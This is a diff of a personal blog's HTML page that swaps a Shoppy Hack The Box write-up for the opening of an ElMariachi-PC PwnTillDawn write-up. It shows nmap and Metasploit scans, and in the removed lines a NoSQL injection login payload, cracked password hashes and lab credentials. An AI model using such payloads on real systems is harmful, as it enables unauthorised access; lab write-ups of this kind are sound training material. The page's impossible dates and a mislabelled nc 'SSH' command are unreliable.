@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Shoppy machine in Hack The Box platform.'><title>Shoppy HTB Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the ElMariachi-PC machine in PwnTillDawn Online platform.'><title>ElMariachi-PC PwnTillDawn Writeup</title>
 
-<link rel='canonical' href='https://AbdallahAdham.com/p/shoppy-htb-writeup/'>
+<link rel='canonical' href='https://AbdallahAdham.com/p/elmariachi-pc-pwntilldawn-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Shoppy HTB Writeup'>
-<meta property='og:description' content='This is a writeup of the Shoppy machine in Hack The Box platform.'>
-<meta property='og:url' content='https://AbdallahAdham.com/p/shoppy-htb-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='ElMariachi-PC PwnTillDawn Writeup'>
+<meta property='og:description' content='This is a writeup of the ElMariachi-PC machine in PwnTillDawn Online platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/elmariachi-pc-pwntilldawn-writeup/'>
 <meta property='og:site_name' content='Abdallah Adham'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-11-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Shoppy_HTB/shoppy_htb.png' />
-<meta name="twitter:title" content="Shoppy HTB Writeup">
-<meta name="twitter:description" content="This is a writeup of the Shoppy machine in Hack The Box platform."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Shoppy_HTB/shoppy_htb.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PwnTillDawn' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-11-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-19T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG' />
+<meta name="twitter:title" content="ElMariachi-PC PwnTillDawn Writeup">
+<meta name="twitter:description" content="This is a writeup of the ElMariachi-PC machine in PwnTillDawn Online platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG' />
     </head>
     <body class="
     article-page
@@ -324,9 +324,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/shoppy-htb-writeup/">
+            <a href="/p/elmariachi-pc-pwntilldawn-writeup/">
                 
-                    <img src="/post/Shoppy_HTB/shoppy_htb.png" loading="lazy" alt="Featured image of post Shoppy HTB Writeup" />
+                    <img src="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG" loading="lazy" alt="Featured image of post ElMariachi-PC PwnTillDawn Writeup" />
                 
             </a>
         </div>
@@ -349,12 +349,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/shoppy-htb-writeup/">Shoppy HTB Writeup</a>
+            <a href="/p/elmariachi-pc-pwntilldawn-writeup/">ElMariachi-PC PwnTillDawn Writeup</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            This is a writeup of the Shoppy machine in Hack The Box platform.
+            This is a writeup of the ElMariachi-PC machine in PwnTillDawn Online platform.
         </h3>
         
     </div>
@@ -372,7 +372,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">July 11, 8088</time>
+                <time class="article-time--published">July 11, 191919</time>
             </div>
         
 
@@ -387,7 +387,7 @@
 
 
                 <time class="article-time--reading">
-                    5 minute read
+                    4 minute read
                 </time>
             </div>
         
@@ -402,63 +402,35 @@
     
     
     <hr>
+<p>This writeup has been authorized by the <strong>PwnTillDawn Crew</strong>!</p>
+<p>Check their websites for more information!</p>
+<ol>
+<li><a class="link" href="https://www.wizlynxgroup.com/"  target="_blank" rel="noopener"
+    >wizlynxgroup</a></li>
+<li><a class="link" href="https://online.pwntilldawn.com/"  target="_blank" rel="noopener"
+    >online.pwntilldawn</a></li>
+</ol>
+<h2 id="target-information">Target Information</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>IP</th>
+<th>Operating System</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>ElMariachi-PC</strong></td>
+<td><strong>10.150.150.69</strong></td>
+<td><strong>Windows</strong></td>
+<td><strong>Easy</strong></td>
+</tr>
+</tbody>
+</table></div>
 <h2 id="scanning">Scanning</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ nmap 10.10.11.180 -A -oN nmap.txt 
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-07 08:19 EST
-</span></span><span class="line"><span class="cl">Stats: 0:00:05 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
-</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
-</span></span><span class="line"><span class="cl">Stats: 0:00:07 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
-</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
-</span></span><span class="line"><span class="cl">Stats: 0:00:50 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
-</span></span><span class="line"><span class="cl">NSE Timing: About 99.29% <span class="k">done</span><span class="p">;</span> ETC: 08:20 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.180
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.21s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 9e5e8351d99f89ea471a12eb81f922c0 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5857eeeb0650037c8463d7a3415b1ad5 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3e9d0a4290443860b3b62ce9bd9a6754 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.23.1
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.23.1
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://shoppy.htb
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.82 seconds
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="enumeration">Enumeration</h2>
-<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<h3 id="nmap-scanning">Nmap Scanning</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -486,98 +458,127 @@
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="s2">&#34;Host: FUZZ.shoppy.htb&#34;</span> -u http://shoppy.htb -t <span class="m">10</span> -mc <span class="m">200</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap 10.150.150.69 -A -p- --min-rate<span class="o">=</span><span class="m">5000</span> -n -sT -Pn --open -oG allports
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.150.150.69
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.094s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">54303</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, <span class="m">11221</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ElMariachi-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-11-18T13:20:31
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2023-05-20T13:20:31
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2022-11-19T16:45:57+00:00<span class="p">;</span> +41m04s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: ELMARIACHI-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: ELMARIACHI-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: ELMARIACHI-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: ElMariachi-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: ElMariachi-PC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2022-11-19T16:45:28+00:00
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50417/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">60000/tcp open  unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">404</span> Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">177</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Keep-Alive
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">401</span> Access Denied
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">144</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Keep-Alive
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     WWW-Authenticate: Digest <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;ThinVNC&#34;</span>, <span class="nv">qop</span><span class="o">=</span><span class="s2">&#34;auth&#34;</span>, <span class="nv">nonce</span><span class="o">=</span><span class="s2">&#34;Bh5opIvq5UDI4UcCi+rlQA==&#34;</span>, <span class="nv">opaque</span><span class="o">=</span><span class="s2">&#34;m2yqFi2usv3AY2yatYSTRmyNPAplB8C1oC&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port60000-TCP:V<span class="o">=</span>7.93%I<span class="o">=</span>7%D<span class="o">=</span>11/19%Time<span class="o">=</span>6378FE2E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
+</span></span><span class="line"><span class="cl">SF:GetRequest,179,<span class="s2">&#34;HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nW
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:WW-Authenticate:\x20Digest\x20realm=\&#34;ThinVNC\&#34;,\x20qop=\&#34;auth\&#34;,\x20no
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:nce=\&#34;Bh5opIvq5UDI4UcCi\+rlQA==\&#34;,\x20opaque=\&#34;m2yqFi2usv3AY2yatYSTRmyN
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:PAplB8C1oC\&#34;\r\n\r\n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401\x20Access\x20Denied&lt;/TITLE&gt;&lt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401\x20Access\x20Denied&lt;/H1&gt;The\x20requested\x20URL\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20requires\x20authorization\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequ
+</span></span><span class="line"><span class="cl">SF:est,111,<span class="s2">&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\r\nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n&lt;HTML&gt;&lt;H
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:EAD&gt;&lt;TITLE&gt;404\x20Not\x20Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404\x20Not\x20Fo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:und&lt;/H1&gt;The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20was\x20not\x20found\x20on\x20this\x20server\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&#34;</span>
+</span></span><span class="line"><span class="cl">SF:<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
-</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
-</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
-</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
-</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
-</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">       v1.5.0 Kali Exclusive &lt;<span class="m">3</span>
-</span></span><span class="line"><span class="cl">________________________________________________
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"> :: Method           : GET
-</span></span><span class="line"><span class="cl"> :: URL              : http://shoppy.htb
-</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: Discovery/DNS/bitquark-subdomains-top100000.txt
-</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.shoppy.htb
-</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
-</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
-</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
-</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">10</span>
-</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
-</span></span><span class="line"><span class="cl">________________________________________________
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">mattermost              <span class="o">[</span>Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 123ms<span class="o">]</span>
-</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>100000/100000<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">64</span> req/sec :: Duration: <span class="o">[</span>0:22:27<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 41m04s, deviation: 0s, median: 41m03s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-11-19T16:45:28
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="directory-enumeration">Directory Enumeration</h3>
-<p>$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="link" href="http://shoppy.htb/FUZZ"  target="_blank" rel="noopener"
-    >http://shoppy.htb/FUZZ</a></p>
-<p>images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 157ms]
-login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 124ms]
-admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 85ms]
-assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 90ms]
-css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 83ms]
-Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 88ms]
-js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 86ms]
-fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 439ms]
-Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 96ms]
-exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 160ms]
-[Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 87ms]
-LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 143ms]
-LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms]
-:: Progress: [220560/220560] :: Job [1/1] :: 443 req/sec :: Duration: [0:09:27] :: Errors: 0 ::</p>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="nosql-injection">NoSQL Injection</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username= admin&#39;||&#39;1==1
-</span></span><span class="line"><span class="cl">password= anything
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">[{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67a&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;23c6877d9e2b564ef8b32c3a23de27b2&#34;</span><span class="p">},</span>
-</span></span><span class="line"><span class="cl"> <span class="p">{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67b&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;josh&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;6ebcea65320589ca4f2f1ce039975995&#34;</span><span class="p">}]</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="hash-decryption">Hash Decryption</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Josh Account:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Hash: 6ebcea65320589ca4f2f1ce039975995
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">type: md5
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">result: remembermethisway
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="ssh-reverse-shell">SSH Reverse shell</h3>
+</div><p>It looks like this machine have only ports related to <strong>SMB and DNS</strong> services.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>I am going to enumerate anything possible about <strong>SMB</strong> services as it is most likely to have <strong>exploits</strong>.</p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>Now, I will use an auxiliary in <strong>Metasploit Framework</strong> to scan for the <strong>SMB version</strong> to search if it is vulnerable to any exploits or not!</p>
+<h4 id="metasploit">Metasploit</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -597,148 +598,173 @@ LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duratio
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Jaeger account:
-</span></span><span class="line"><span class="cl">username: jaeger
-</span></span><span class="line"><span class="cl">password: Sh0ppyBest@pp!
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search auxiliary/scanner/smb/smb_version
+</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">─$ nc jaeger@shoppy.htb
-</span></span><span class="line"><span class="cl">jaeger@shoppy.htb password: Sh0ppyBest@pp!
-</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                               Disclosure Date  Rank    Check  Description</span>
+</span></span><span class="line"><span class="cl">   -  ----                               ---------------  ----    -----  -----------
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
-</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
-</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-</span></span><span class="line"><span class="cl">permitted by applicable law.
-</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 05:53:00 <span class="m">2022</span> from 10.10.14.38
-</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ ls
